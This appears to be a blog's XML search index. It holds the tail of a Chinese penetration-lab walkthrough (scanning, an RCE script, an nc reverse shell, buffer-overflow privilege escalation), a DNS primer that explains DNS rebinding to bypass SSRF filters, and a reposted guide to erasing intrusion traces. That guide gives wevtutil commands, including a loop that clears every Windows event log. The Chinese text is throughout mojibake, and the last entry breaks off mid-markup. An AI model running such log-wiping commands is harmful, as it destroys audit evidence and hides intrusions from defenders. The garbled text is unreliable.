alt="image-20230307182708576"></p><p><img src="/../images/image-20230307182726635-1686283466997.png" alt="image-20230307182726635"></p><p>å¼€æ”¾äº†å¾ˆå¤šç«¯å£å’ŒæœåŠ¡ï¼Œä¸åŒç«¯å£ä¸Šéƒ½æœ‰ç½‘ç«™ï¼Œæ‰€ä»¥ç›®å½•æ‰«ææ—¶éœ€è¦æ³¨æ„æ‰«å“ªä¸ªç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66</span><br><span class="line">80</span><br><span class="line">8086</span><br></pre></td></tr></table></figure><ul><li><p>80ç«¯å£</p><p><img src="/../images/image-20230307224547682-1686283466997.png" alt="image-20230307224547682"></p><p>msfä¸€æ¡é¾™</p></li></ul><p><img src="/../images/image-20230307224427084-1686283466997.png" alt="image-20230307224427084"></p><p><img src="/../images/image-20230307224412649-1686283466997.png" alt="image-20230307224412649"></p><ul><li><p>66ç«¯å£</p><p>dirsearchæ‰«æç»“æœ</p><p><img src="/../images/image-20230307224912102-1686283466997.png" alt="image-20230307224912102"></p><p><img src="/../images/image-20230307224854194-1686283466998.png" alt="image-20230307224854194"></p><p>â€‹å†å²å‘½ä»¤æ“ä½œ.bash_historyé‡è¦éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line">mv root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ä»åˆ«çš„ä¸»æœºä¸Šå¤åˆ¶äº†flagï¼Œå¹¶é‡åä¸ºflag.txt</p></li><li><p>8086</p><p><img src="/../images/image-20230307225845372-1686283466998.png" alt="image-20230307225845372"></p><p>éƒ½æ˜¯é™æ€é¡µé¢</p></li></ul><p>è¿™é‡Œçœ‹äº†wpæ­£å¸¸æ˜¯ä»66ç«¯å£ç›®å½•æ‰«æå‡º&#x2F;enoç›®å½•ï¼Œä¸‹è½½å¹¶ç ´è§£zipå‹ç¼©åŒ…ï¼Œè·å¾—80ç«¯å£çš„ç”¨æˆ·å‡­è¯çš„ã€‚ã€‚</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰8</p><p><img src="/../images/image-20230307232027664-1686283466998.png" alt="image-20230307232027664"></p><p>ç½‘ç«™</p><p>åªæœ‰ä¸€ä¸ªç™»å½•æ¡†</p><p>sqlæ³¨å…¥å¤±è´¥ï¼Œå¼±å£ä»¤çˆ†ç ´å¤±è´¥</p><p>ç›®å½•æ‰«æ</p><p><img src="/../images/image-20230307234601067-1686283466998.png" alt="image-20230307234601067"></p><p>çœ‹åˆ°backupè¿˜ä»¥ä¸ºæœ‰å¤‡ä»½æ–‡ä»¶å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†æ˜¯æ²¡æœ‰ï¼›</p><p>è®¿é—®&#x2F;admin&#x2F;home.phpå°è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒï¼Œå‘ç°æ²¡æœ‰ã€‚</p><p>å¯»æ‰¾ç½‘ç«™æ¡†æ¶æ¼æ´ </p><p><img src="/../images/image-20230307234835760-1686283466999.png" alt="image-20230307234835760"></p><p>å°è¯•äº†ä¹‹åå‘ç°åªå­˜åœ¨rceæ¼æ´</p><p><img src="/../images/image-20230307233410737-1686283466999.png" alt="image-20230307233410737"></p><p><img src="/../images/image-20230307233603248-1686283466999.png" alt="image-20230307233603248"></p><p><img src="/../images/image-20230307233643324-1686283466999.png" alt="image-20230307233643324"></p><p>ä½¿ç”¨ç¬¬äºŒä¸ªpyè„šæœ¬</p><p><img src="/../images/image-20230308001806203-1686283466999.png" alt="image-20230308001806203"></p><p><img src="/../images/image-20230308001820794-1686283466999.png" alt="image-20230308001820794"></p><p>è¿™ä¸ªè„šæœ¬å¾ˆè´´å¿ƒåœ°ç»™å‡ºäº†æœåŠ¡å™¨ä¿¡æ¯ï¼Œå¹¶è¯»å–äº†é…ç½®æ–‡ä»¶ï¼Œè·å¾—äº†claptonç”¨æˆ·çš„å‡­è¯ã€‚</p><p><img src="/../images/image-20230307234930848-1686283467000.png" alt="image-20230307234930848"></p><p>å‘ç°å¤§éƒ¨åˆ†å‘½ä»¤æ˜æ˜å¯ä»¥ä½¿ç”¨çš„å´éƒ½æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥éœ€è¦åå¼¹shellåˆ°kaliï¼Œç»æµ‹è¯•å¯ä»¥ä½¿ç”¨ncè¿›è¡Œåå¼¹shell</p><p><img src="/../images/image-20230308130950848-1686283467000.png" alt="image-20230308130950848"></p><p>ä½¿ç”¨pythonåˆ‡æ¢ä¸ºäº¤äº’å¼shellï¼Œåˆ‡æ¢åˆ°claptonç”¨æˆ·</p><p><img src="/../images/image-20230308131017546-1686283467000.png" alt="image-20230308131017546"></p><p>å‘ç°claptonå®¶ç›®å½•ä¸‹æœ‰note.txt</p><p><img src="/../images/image-20230308131125354-1686283467000.png" alt="image-20230308131125354"></p><p>è¯»å–</p><p><img src="/../images/image-20230308131243068-1686283467000.png" alt="image-20230308131243068"></p><p>æç¤ºæˆ‘ä»¬ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ææƒï¼Œè¿™éƒ¨åˆ†pwnä¸ä¼š</p><p>æŒ‰ç…§ä¸‹é¢æ–‡ç« ä¸­çš„æ–¹æ³•è¿›è¡Œå¤ç°</p><p><a href="https://zhuanlan.zhihu.com/p/570218595">https://zhuanlan.zhihu.com/p/570218595</a></p><p>æœ€åè´´ä¸Šå¤ç°æˆåŠŸçš„æˆªå›¾</p><p><img src="/../images/image-20230308130938122-1686283467000.png" alt="image-20230308130938122"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNSåè®®</title>
      <link href="/2023/06/01/DNS%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/01/DNS%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="DNSåè®®ä»‹ç»"><a href="#DNSåè®®ä»‹ç»" class="headerlink" title="DNSåè®®ä»‹ç»"></a>DNSåè®®ä»‹ç»</h1><p>DNSï¼ˆDomain Name Systemï¼‰åè®®ä½äºISOå‚è€ƒæ¨¡å‹çš„åº”ç”¨å±‚ã€‚åœ¨ISOå‚è€ƒæ¨¡å‹ä¸­ï¼Œåº”ç”¨å±‚æ˜¯æœ€é«˜å±‚ï¼Œè´Ÿè´£æä¾›ç½‘ç»œæœåŠ¡å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„æ¥å£ã€‚</p><p>DNSåè®®çš„ä¸»è¦åŠŸèƒ½æ˜¯å°†åŸŸåè§£æä¸ºIPåœ°å€ã€‚å½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªåŸŸåæ—¶ï¼Œä¾‹å¦‚â€<a href="http://example.com/">example.com</a>â€œï¼Œæµè§ˆå™¨ä¼šå‘é€ä¸€ä¸ªDNSæŸ¥è¯¢è¯·æ±‚åˆ°æœ¬åœ°DNSæœåŠ¡å™¨ã€‚æœ¬åœ°DNSæœåŠ¡å™¨é€šè¿‡DNSåè®®å‘ä¸Šçº§DNSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œé€çº§æŸ¥è¯¢ï¼Œç›´è‡³æ‰¾åˆ°ä¸åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·çš„è®¾å¤‡ã€‚è¿™æ ·ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡åŸŸåæ¥è®¿é—®äº’è”ç½‘ä¸Šçš„èµ„æºï¼Œè€Œä¸éœ€è¦è®°ä½å¤æ‚çš„IPåœ°å€ã€‚</p><p>DNSåè®®æ”¯æŒUDPå’ŒTCPï¼Œç«¯å£å·ä¸º53</p><h1 id="åŸŸååˆ†ç±»"><a href="#åŸŸååˆ†ç±»" class="headerlink" title="åŸŸååˆ†ç±»"></a>åŸŸååˆ†ç±»</h1><p><img src="/../images/image-20221115163957139-1694328360129.png" alt="image-20221115163957139"></p><h1 id="DNS-TTL"><a href="#DNS-TTL" class="headerlink" title="DNS TTL"></a>DNS TTL</h1><p>TTLå€¼å…¨ç§°æ˜¯â€œç”Ÿå­˜æ—¶é—´ï¼ˆTime To Live)â€ï¼Œç®€å•çš„è¯´å®ƒè¡¨ç¤ºDNSè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šç¼“å­˜æ—¶é—´ï¼Œæ•°å€¼è¶Šå°ï¼Œä¿®æ”¹è®°å½•å„åœ°ç”Ÿæ•ˆæ—¶é—´è¶Šå¿«ã€‚<br>å½“å„åœ°çš„DNS(LDNS)æœåŠ¡å™¨æ¥å—åˆ°è§£æè¯·æ±‚æ—¶ï¼Œå°±ä¼šå‘åŸŸåæŒ‡å®šçš„æˆæƒDNSæœåŠ¡å™¨å‘å‡ºè§£æè¯·æ±‚ä»è€Œè·å¾—è§£æè®°å½•ï¼›è¯¥è§£æè®°å½•ä¼šåœ¨DNS(LDNS)æœåŠ¡å™¨ä¸­ä¿å­˜ä¸€æ®µæ—¶é—´ï¼Œè¿™æ®µæ—¶é—´å†…å¦‚æœå†æ¥åˆ°è¿™ä¸ªåŸŸåçš„è§£æè¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨å°†ä¸å†å‘æˆæƒDNSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›åˆšæ‰è·å¾—çš„è®°å½•ï¼›è€Œè¿™ä¸ªè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šä¿ç•™çš„æ—¶é—´ï¼Œå°±æ˜¯TTLå€¼ã€‚</p><p>å¸¸è§çš„è®¾ç½®TTLå€¼çš„åœºæ™¯ï¼š<br>â€¢ å¢å¤§TTLå€¼ï¼Œä»¥èŠ‚çº¦åŸŸåè§£ææ—¶é—´<br>â€¢ å‡å°TTLå€¼ï¼Œå‡å°‘æ›´æ–°åŸŸåè®°å½•æ—¶çš„ä¸å¯è®¿é—®æ—¶é—´</p><h1 id="æµè§ˆå™¨DNSè§£ææµç¨‹"><a href="#æµè§ˆå™¨DNSè§£ææµç¨‹" class="headerlink" title="æµè§ˆå™¨DNSè§£ææµç¨‹"></a>æµè§ˆå™¨DNSè§£ææµç¨‹</h1><p>å› ä¸ºæ¯æ¬¡è¯·æ±‚æ—¶éƒ½å‘DNSæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œè¿‡äºæµªè´¹èµ„æºï¼Œæ‰€ä»¥å‡ºç°äº†DNSç¼“å­˜ã€‚</p><p><strong>æµè§ˆå™¨DNSæŸ¥æ‰¾é¡ºåºä¸€èˆ¬æ˜¯è¿™æ ·çš„:</strong> </p><p>   æµè§ˆå™¨DNSç¼“å­˜-&gt;æœ¬åœ°ç³»ç»ŸDNSç¼“å­˜-&gt;æœ¬åœ°è®¡ç®—æœºHOSTSæ–‡ä»¶-&gt;è·¯ç”±å™¨DNSç¼“å­˜-&gt;ISPçš„DNSç¼“å­˜-&gt;æ ¹æœåŠ¡å™¨é€’å½’æœç´¢</p><ul><li><p>æµè§ˆå™¨DNSç¼“å­˜ï¼ˆå†…å­˜ä¸­)</p><p>æµè§ˆå™¨ä¼šæŒ‰ç…§ä¸€å®šé¢‘ç‡ç¼“å­˜DNSè®°å½•  <a href="https://www.jianshu.com/p/9e7aa4ec4b46">æŸ¥çœ‹googleæµè§ˆå™¨DNSç¼“å­˜</a></p></li><li><p>æœ¬åœ°DNSç¼“å­˜(å†…å­˜ä¸­)</p><p>æŸ¥çœ‹ï¼š<code>ipconfig /displaydns</code></p><p>æ¸…é™¤ï¼š<code>ipconfig /flushdns</code></p></li><li><p>æœ¬åœ°HOSTSæ–‡ä»¶</p><p><code>c:\windows\system32\drivers\etc\hosts </code> </p></li><li><p>è·¯ç”±å™¨DNSç¼“å­˜</p><blockquote><p>è·¯ç”±å™¨DNSè¢«ç¯¡æ”¹ä¼šé€ æˆåŸŸååŠ«æŒï¼Œä½ è®¿é—®çš„ç½‘å€éƒ½ä¼šè¢«å®šä½åˆ°åŒä¸€ä¸ªä½ç½®ï¼Œä½†æ˜¯IPç›´æ¥å¯ä»¥è®¿é—®</p></blockquote></li><li><p>ISPçš„DNSæœåŠ¡å™¨</p><ul><li><p>å…¬å…±æœåŠ¡å™¨</p><p><code>8.8.8.8</code> (Google æä¾›)</p><p><code>114.114.114.114</code> (å›½å†…å…¬å…± DNS)</p></li><li><p>ä¸“ç”¨æœåŠ¡å™¨</p></li></ul></li><li><p>æ ¹æœåŠ¡å™¨</p><blockquote><p>ä»¥è®¿é—®<a href="http://www.baidu.comä¸ºä¾‹,/">www.baidu.comä¸ºä¾‹ï¼Œ</a> DNSæœåŠ¡å™¨å…ˆé—®æ ¹åŸŸåæœåŠ¡å™¨.comåŸŸåæœåŠ¡å™¨çš„IPåœ°å€ï¼Œç„¶åå†é—®.comåŸŸåæœåŠ¡å™¨ï¼Œä»¥æ­¤ç±»æ¨</p></blockquote></li></ul><p><img src="/../images/image-20221115164624383-1694328362681.png" alt="image-20221115164624383"></p><h1 id="è®¾ç½®DNSè§£æ"><a href="#è®¾ç½®DNSè§£æ" class="headerlink" title="è®¾ç½®DNSè§£æ"></a>è®¾ç½®DNSè§£æ</h1><p>ä»¥é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸ºä¾‹</p><p><img src="/../images/image-20221004160123895-1694328366241.png" alt="image-20221004160123895"></p><ul><li><p>ä¸»æœºè®°å½•</p><p>å°±æ˜¯è¦è§£æçš„åŸŸåï¼Œæ¯”å¦‚ç½‘ç«™æ ¹åŸŸåä¸ºkhaz.topï¼Œä¸»æœºè®°å½•@å³@khaz.topç­‰ä»·äºkhaz.top</p><blockquote><p>é€šå¸¸ä¼šå°†åŠ wwwå’Œä¸åŠ wwwçš„åŸŸåéƒ½è§£æåˆ°åŒä¸€ä¸ªipä¸Šã€‚</p></blockquote></li><li><p>è®°å½•ç±»å‹</p><p><img src="/../images/image-20221004160443733-1694328407151.png" alt="image-20221004160123896"></p></li><li><p>è§£æçº¿è·¯</p><p>å°±æ˜¯é€‰æ‹©å“ªä¸€ä¸ªISPçš„DNSæœåŠ¡å™¨ã€‚</p></li><li><p>è®°å½•å€¼</p><p>å°±æ˜¯åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚</p></li><li><p>TTL</p><p>DNSç¼“å­˜æ—¶é—´ï¼Œå½“ä¿®æ”¹DNSè§£ææ—¶ï¼Œéœ€è¦ç»è¿‡TTLæ—¶é—´æ‰ä¼šç”Ÿæ•ˆã€‚</p></li></ul><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><h4 id="å½“å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPæ—¶ï¼Œå¦‚æœé€šè¿‡IPåœ°å€æ¥è®¿é—®æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¼šè®¿é—®åˆ°å“ªä¸€ä¸ªåŸŸåï¼ˆç½‘ç«™ï¼‰å‘¢ï¼Ÿ"><a href="#å½“å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPæ—¶ï¼Œå¦‚æœé€šè¿‡IPåœ°å€æ¥è®¿é—®æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¼šè®¿é—®åˆ°å“ªä¸€ä¸ªåŸŸåï¼ˆç½‘ç«™ï¼‰å‘¢ï¼Ÿ" class="headerlink" title="å½“å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPæ—¶ï¼Œå¦‚æœé€šè¿‡IPåœ°å€æ¥è®¿é—®æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¼šè®¿é—®åˆ°å“ªä¸€ä¸ªåŸŸåï¼ˆç½‘ç«™ï¼‰å‘¢ï¼Ÿ"></a>å½“å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPæ—¶ï¼Œå¦‚æœé€šè¿‡IPåœ°å€æ¥è®¿é—®æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¼šè®¿é—®åˆ°å“ªä¸€ä¸ªåŸŸåï¼ˆç½‘ç«™ï¼‰å‘¢ï¼Ÿ</h4><p>ç­”æ¡ˆï¼š</p><ol><li><p>è™šæ‹Ÿä¸»æœºæŠ€æœ¯</p><p>å®ç°å¤šä¸ªç«™ç‚¹åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚</p><blockquote><p>æ¯”å¦‚æœåŠ¡å™¨ä½¿ç”¨Apacheï¼Œé‚£ä¹ˆåœ¨Apacheçš„é…ç½®æ–‡ä»¶ä¸­åŠ å…¥VirtualHostå³å¯æ–°å¢è™šæ‹Ÿä¸»æœº</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/acm</span><br><span class="line"> ServerName acm.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">    </span><br><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line"> DocumentRoot /<span class="keyword">var</span>/www/html</span><br><span class="line"> ServerName www.hdu.edu.cn</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>ServerNameå¯¹åº”è¯·æ±‚å¤´çš„HOSTå­—æ®µï¼ŒDocumentRootå¯¹åº”çš„ç«™ç‚¹ç›®å½•</p><p>è¿™æ ·HOSTä¸ºacm.hdu.edu.cnæ—¶ï¼Œè®¿é—®çš„å°±æ˜¯&#x2F;var&#x2F;www&#x2F;acmä¸‹çš„acm.hdu.edu.cnç½‘ç«™</p><p>HOSTä¸º<a href="http://www.hdu.edu.cnæ—¶,è®¿é—®çš„å°±æ˜¯/var/www/html%E4%B8%8B%E7%9A%84www.hdu.edu.cn%E7%BD%91%E7%AB%99">www.hdu.edu.cnæ—¶ï¼Œè®¿é—®çš„å°±æ˜¯/var/www/htmlä¸‹çš„www.hdu.edu.cnç½‘ç«™</a></p><blockquote><p>è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä¹Ÿå¯ä»¥å®ç°ä¸åŒç«¯å£å¯¹åº”ä¸åŒç«™ç‚¹ï¼Œåªè¦ä¿®æ”¹ä¸Šé¢çš„&lt;VirtualHost *:80&gt;å³å¯ã€‚</p></blockquote></li><li><p>åå‘ä»£ç†æŠ€æœ¯</p><p>æ¯ä¸ªç«™ç‚¹éƒ½åœ¨ä¸åŒçš„ä¸»æœºä¸Šï¼Œä½†éƒ½æ˜¯é€šè¿‡Eè¿™ä¸ªä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®çš„ã€‚</p><p><img src="/../images/reverse-proxy-flow-1694328428983.svg" alt="åå‘ä»£ç†æµ"></p></li></ol><h1 id="å®‰å…¨ç›¸å…³"><a href="#å®‰å…¨ç›¸å…³" class="headerlink" title="å®‰å…¨ç›¸å…³"></a>å®‰å…¨ç›¸å…³</h1><h2 id="DNSæ¬ºéª—æ”»å‡»"><a href="#DNSæ¬ºéª—æ”»å‡»" class="headerlink" title="DNSæ¬ºéª—æ”»å‡»"></a>DNSæ¬ºéª—æ”»å‡»</h2><p>DNSæ¬ºéª—æ”»å‡»ï¼ˆDNS spoofing attackï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…é€šè¿‡ç¯¡æ”¹æˆ–ä¼ªé€ åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰çš„è§£æç»“æœï¼Œå°†ç”¨æˆ·çš„è¯·æ±‚é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™æˆ–è¿›è¡Œä¿¡æ¯çªƒå–ç­‰æ¶æ„è¡Œä¸ºã€‚è¿™ç§æ”»å‡»æ–¹å¼å¯èƒ½å¯¼è‡´ç”¨æˆ·è¢«å¼•å¯¼åˆ°è™šå‡çš„ç½‘ç«™ï¼Œä»è€Œé­å—é’“é±¼è¯ˆéª—ã€æ¶æ„è½¯ä»¶ä¸‹è½½ã€ä¸ªäººä¿¡æ¯æ³„éœ²ç­‰é£é™©ã€‚</p><h2 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS  Rebinding"></a>DNS  Rebinding</h2><p><strong>æœ‰æ¼æ´çš„SSRFè¿‡æ»¤å™¨æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹</strong></p><ol><li>è·å–è¾“å…¥çš„URLï¼Œä»è¯¥URLä¸­æå–HOSTï¼Œå¦‚æœæå–å‡ºæ¥çš„æ˜¯IPï¼Œé‚£ä¹ˆç›´æ¥è·³åˆ°ç¬¬ä¸‰æ­¥ï¼›</li><li>å¯¹è¯¥HOSTè¿›è¡ŒDNSè§£æï¼Œè·å–åˆ°è§£æçš„IPï¼›</li><li>æ£€æµ‹è¯¥IPæ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯ç§æœ‰IPç­‰ï¼ˆæ˜¯å°±ç›´æ¥ç»ˆæ­¢æµç¨‹ï¼‰ï¼›</li><li>å¦‚æœIPæ£€æµ‹ä¸ºåˆæ³•çš„ï¼Œåˆ™è¿›å…¥CURLå‘åŒ…ï¼›</li></ol><p><strong>æ¼æ´ç‚¹</strong><br>DNSè§£æä¸€å…±åˆ†ä¸¤æ¬¡ï¼Œå…¶ä¸­ç¬¬ä¸€æ¬¡æ˜¯è‡³å…³é‡è¦çš„æœ‰æ•ˆæ€§æ£€æµ‹ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯å…·ä½“å‘èµ·çš„è¯·æ±‚ã€‚æˆ‘ä»¬åˆ©ç”¨DNS RebindingæŠ€æœ¯ï¼Œåœ¨<strong>ç¬¬ä¸€æ¬¡æ ¡éªŒIP</strong>çš„æ—¶å€™<strong>è¿”å›ä¸€ä¸ªåˆæ³•çš„IP</strong>ï¼Œåœ¨<strong>çœŸå®å‘èµ·è¯·æ±‚</strong>çš„æ—¶å€™ï¼Œè¿”å›æˆ‘ä»¬<strong>çœŸæ­£æƒ³è¦è®¿é—®çš„å†…ç½‘IP</strong>å³å¯ã€‚</p><p><strong>å®ç°æ–¹å¼</strong></p><ul><li>åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡TTLéƒ½æ˜¯0çš„Aè®°å½•ï¼Œä¸è¿‡è¿™æ ·DNSè§£ææ˜¯éšæœºçš„ï¼Œä¸å¤Ÿç¨³å®š</li><li>é€šè¿‡è‡ªå»ºDNSæœåŠ¡å™¨ï¼Œç¨³å®šæ§åˆ¶è§£æè¿”å›ç»“æœ</li></ul><h2 id="DNS-Log"><a href="#DNS-Log" class="headerlink" title="DNS Log"></a>DNS Log</h2><p>nsè®°å½•æŒ‡å‘è‡ªå»ºçš„DNSæœåŠ¡å™¨ï¼Œç„¶åå½“ç›®æ ‡ä¸»æœºå‘èµ·DNS Queryæ—¶ï¼Œè‡ªå»ºçš„DNSæœåŠ¡å™¨å°±è®°å½•ä¸‹è¯¥è¯·æ±‚ã€‚ä»ä¸‹å›¾ä¸­å¯ä»¥çœ‹åˆ°å‘NSæœåŠ¡å™¨å‘èµ·DNSè¯·æ±‚çš„ä¸ºç”¨æˆ·è®¾ç½®çš„DNSæœåŠ¡å™¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæŸ¥çœ‹DNSLogè®°å½•çš„IPä¸æ˜¯ç›®æ ‡ä¸»æœºçš„åŸå› ã€‚</p><p><img src="/../images/20210615113242-57d33758-cd8a-1.png" alt="20210615113242-57d33758-cd8a-1"></p><h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><p>nslookup&#x2F;dig</p><p><a href="https://blog.csdn.net/weixin_42426841/article/details/115364502">https://blog.csdn.net/weixin_42426841/article/details/115364502</a></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å…¥ä¾µç—•è¿¹æ¸…ç†</title>
      <link href="/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
      <url>/2023/06/01/%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è½¬è½½è‡ª<a href="https://www.cnblogs.com/yokan/p/15701536.html">https://www.cnblogs.com/yokan/p/15701536.html</a></p></blockquote><p>åœ¨æ”»å‡»ç»“æŸåï¼Œå¦‚ä½•ä¸ç•™ç—•è¿¹çš„æ¸…é™¤æ—¥å¿—å’Œæ“ä½œè®°å½•ï¼Œä»¥æ©ç›–å…¥ä¾µè¸ªè¿¹ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªç»†è‡´çš„æŠ€æœ¯æ´»ã€‚åœ¨è“é˜Ÿçš„æº¯æºä¸­ï¼Œæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„éƒ½å°†è®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œæ‰€é—ç•™çš„å·¥å…·ä¹Ÿä¼šè¢«è“é˜Ÿè¿›è¡Œåˆ†æï¼Œåœ¨å·¥å…·ä¸­å¯ä»¥æŸ¥æ‰¾ç‰¹å¾ï¼Œçº¢é˜Ÿè‡ªç ”å·¥å…·æ›´å®¹æ˜“ç•™ä¸‹è››ä¸é©¬è¿¹ã€‚ä½ æ‰€åšçš„æ¯ä¸€ä¸ªæ“ä½œï¼Œéƒ½è¦è¢«æŠ¹æ‰ï¼›ä½ æ‰€ä¸Šä¼ çš„å·¥å…·ï¼Œéƒ½åº”è¯¥è¢«å®‰å…¨åœ°åˆ æ‰ï¼Œä»¥é˜²è¢«æº¯æºåœ¨æ¼”ç»ƒä¸­å¤±åˆ†ã€‚</p><h2 id="Windowså…¥ä¾µç—•è¿¹æ¸…ç†"><a href="#Windowså…¥ä¾µç—•è¿¹æ¸…ç†" class="headerlink" title="Windowså…¥ä¾µç—•è¿¹æ¸…ç†"></a>Windowså…¥ä¾µç—•è¿¹æ¸…ç†</h2><h3 id="Windowsæ—¥å¿—æ¸…é™¤"><a href="#Windowsæ—¥å¿—æ¸…é™¤" class="headerlink" title="Windowsæ—¥å¿—æ¸…é™¤"></a>Windowsæ—¥å¿—æ¸…é™¤</h3><p>Windowsæ—¥å¿—è·¯å¾„ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ç³»ç»Ÿæ—¥å¿—ï¼š<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\System.evtx</span><br><span class="line">å®‰å…¨æ—¥å¿—ï¼š<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\Security.evtx</span><br><span class="line">åº”ç”¨ç¨‹åºæ—¥å¿—ï¼š<span class="variable">%SystemRoot%</span>\System32\Winevt\Logs\Application.evtx</span><br><span class="line"></span><br><span class="line">æ—¥å¿—åœ¨æ³¨å†Œè¡¨çš„é”®ï¼šHKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</span><br></pre></td></tr></table></figure><p>å¸¸è§çš„å®‰å…¨äº‹ä»¶IDï¼š</p><p><img src="/../images/1964477-20211217110446774-1876570839.png" alt="img"></p><p>windows æ—¥å¿—æ¸…é™¤æ–¹å¼ï¼š</p><h4 id="ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼"><a href="#ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼" class="headerlink" title="ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼"></a><strong>ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼</strong></h4><p>å¼€å§‹â†’è¿è¡Œ,è¾“å…¥ <code>eventvwr</code> è¿›å…¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå³è¾¹æ é€‰æ‹©æ¸…é™¤æ—¥å¿—ã€‚</p><p><img src="/../images/1964477-20211217110511425-1770500557.png" alt="img"></p><p>æˆ–è€…ä½¿ç”¨wevtutil</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wevtutil el             åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§°</span><br><span class="line"><span class="keyword">for</span> /F &quot;tokens=*&quot; %a <span class="keyword">in</span> (&#x27;wevtutil.exe el&#x27;) <span class="keyword">DO</span> wevtutil.exe cl &quot;%a&quot;  æ¸…é™¤æ‰€æœ‰æ—¥å¿—</span><br><span class="line">wevtutil cl system      æ¸…ç†ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—</span><br><span class="line">wevtutil cl security    æ¸…ç†å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ2ï¼‰powershellä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿—"><a href="#ï¼ˆ2ï¼‰powershellä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿—" class="headerlink" 